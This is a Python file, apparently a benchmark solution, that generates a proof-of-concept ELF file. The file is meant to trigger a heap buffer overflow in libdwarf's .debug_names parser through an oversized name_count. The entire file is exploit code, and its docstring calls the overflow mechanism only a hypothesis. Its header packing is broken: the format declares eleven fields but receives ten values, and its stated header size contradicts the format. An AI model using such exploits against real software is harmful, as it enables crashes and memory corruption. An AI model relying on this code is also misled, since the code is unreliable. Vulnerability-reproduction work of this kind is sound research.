import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in libdwarf's .debug_names parser.
        
        The vulnerability stems from a 32-bit integer overflow during the calculation
        of buffer sizes for tables within the .debug_names section. On 64-bit builds,
        the library incorrectly calculates the size for three distinct tables based on
        `name_count`, assuming each entry is 8 bytes (`sizeof(Dwarf_Word)`), leading to
        a multiplication factor of 24.

        The core of the exploit is the hypothesis that the `name_count * 24`
        calculation is performed using 32-bit arithmetic, which can be overflowed.
        By selecting `name_count = 0xAAAAAAAB`, the product `0xAAAAAAAB * 24` overflows
        to `0x100000004`, with the lower 32 bits being `4`.

        This results in a `malloc(4)` call. Subsequently, the parsing logic enters a
        loop that iterates `name_count` (0xAAAAAAAB) times. The very second iteration
        attempts to write past the allocated 4-byte boundary, triggering a massive
        heap buffer overflow.

        The PoC constructs a minimal 64-bit ELF file containing a `.debug_names`
        section crafted with this specific `name_count` value to trigger the
        vulnerability.
        """
        
        name_count_trigger = 0xAAAAAAAB

        debug_names_header = struct.pack(
            '<IHHIIIIIIII',
            0,                   # unit_length (placeholder)
            5,                   # version (DWARF5)
            0,                   # padding
            0,                   # cu_count
            0,                   # local_tu_count
            0,                   # foreign_tu_count
            0,                   # bucket_count
            name_count_trigger,  # name_count - THE TRIGGER
            0,                   # abbrev_table_size
            0,                   # augmentation_string_size
        )

        # The loader checks if the section size is sufficient for the (mis)calculated
        # data size. header_size (36) + miscalculated_area_size (4) = 40.
        # We make the section exactly 40 bytes long to pass this check.
        required_size = 40
        padding_len = required_size - len(debug_names_header)
        debug_names_content = debug_names_header + (b'\x00' * padding_len)

        # Update unit_length, which is the size of the content excluding the length field itself.
        unit_length = len(debug_names_content) - 4
        debug_names_content = struct.pack('<I', unit_length) + debug_names_content[4:]

        shstrtab_content = b'\0.shstrtab\0.debug_names\0'

        e_shoff = 64
        e_shentsize = 64
        e_shnum = 3
        e_shstrndx = 1

        elf_header = struct.pack(
            '<16sHHIIQQQIHHHHHH',
            b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            2,      # e_type = ET_EXEC
            0x3e,   # e_machine = EM_X86_64
            1,      # e_version
            0,      # e_entry
            0,      # e_phoff
            e_shoff,
            0,      # e_flags
            64,     # e_ehsize
            0,      # e_phentsize
            0,      # e_phnum
            e_shentsize,
            e_shnum,
            e_shstrndx
        )

        shstrtab_offset = e_shoff + e_shnum * e_shentsize
        debug_names_offset = shstrtab_offset + len(shstrtab_content)

        sh_null = b'\0' * e_shentsize

        sh_shstrtab = struct.pack(
            '<IIQQQQIIQQ',
            1,   # sh_name (offset of ".shstrtab" in shstrtab)
            3,   # sh_type (SHT_STRTAB)
            0, 0,
            shstrtab_offset,
            len(shstrtab_content),
            0, 0,
            1, 0
        )

        sh_debug_names = struct.pack(
            '<IIQQQQIIQQ',
            11,  # sh_name (offset of ".debug_names" in shstrtab)
            1,   # sh_type (SHT_PROGBITS)
            0, 0,
            debug_names_offset,
            len(debug_names_content),
            0, 0,
            1, 0
        )

        section_headers = sh_null + sh_shstrtab + sh_debug_names

        poc = elf_header + section_headers + shstrtab_content + debug_names_content
        return poc